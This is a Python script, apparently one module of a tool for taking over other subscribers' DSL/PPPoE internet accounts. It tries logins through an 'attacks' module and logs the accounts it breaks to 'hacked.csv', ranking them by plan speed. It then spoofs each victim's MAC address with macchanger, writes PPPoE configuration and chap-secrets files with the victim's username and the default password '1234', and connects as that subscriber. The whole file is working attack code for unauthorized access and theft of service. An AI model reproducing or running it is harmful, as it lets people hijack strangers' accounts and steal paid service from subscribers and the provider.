import attacks
from user import User
import subprocess
import speedtest
from datetime import datetime
import time

TESTED = []
DSL = 'noipdefault\ndefaultroute\nreplacedefaultroute\nhide-password\nnoauth\npersist\nplugin rp-pppoe.so eth0\nuser ' \
      '"{}"\nusepeerdns '


def init(args):
    global TESTED
    TESTED = args


def test_speed():
    s = speedtest.Speedtest()
    s.get_servers()
    s.get_best_server()
    s.download()
    res = s.results.dict()
    return '{:.2f} MB/s'.format(res["download"] / 8000000)


def speed(plan):
    try:
        plan = plan[:plan.index('Mbps')]
        plan = plan[plan.rindex('_') + 1:]
        return int(plan)
    except:
        return 0


def test_login(username):
    if username not in TESTED:
        user = attacks.login(User(username[:-1]))

        if user:
            with open('resources/hacked.csv', 'a+') as file:
                file.write(str(user))

        with open('resources/tested.txt', 'a+') as file:
            file.write(username)


def get_hacked_users():
    users = []
    for i in open('resources/hacked.csv', 'r').readlines():
        try:
            account = i.split(',')
            user = User(account[0], '1234', account[1], speed(account[2]))
            users.append(user)
        except:
            pass

    return sorted(users, key=lambda x: x.plan, reverse=True)


def test_connection(user: User):
    subprocess.call(['sudo', 'poff', '-a'],shell=True)
    subprocess.call(['sudo', 'ifconfig', 'eth0', 'down'],shell=True)
    subprocess.call(['sudo', 'macchanger', '-m', user.mac, 'eth0'],shell=True)
    subprocess.call(['sudo', 'ifconfig', 'eth0', 'up'],shell=True)
    with open('/etc/ppp/peers/dsl-provider', 'w') as f:
        f.write(DSL.format(user.username))
    with open('/etc/ppp/chap-secrets', 'w') as f:
        f.write(f'"{user.username}" * "1234"')
    subprocess.call(['sudo', 'pon', 'dsl-provider'],shell=True)

    connected = False
    retry = 5
    while connected != True and retry > 0:
        try:
            user.plan = test_speed()
            with open(f'resources/connected-{datetime.today().strftime("%Y-%m-%d")}.csv', 'a+') as f:
                f.write(str(user))
            connected = True
        except:
            time.sleep(5)
            retry = retry - 1
    if not connected:
        user.mac = None
    return user
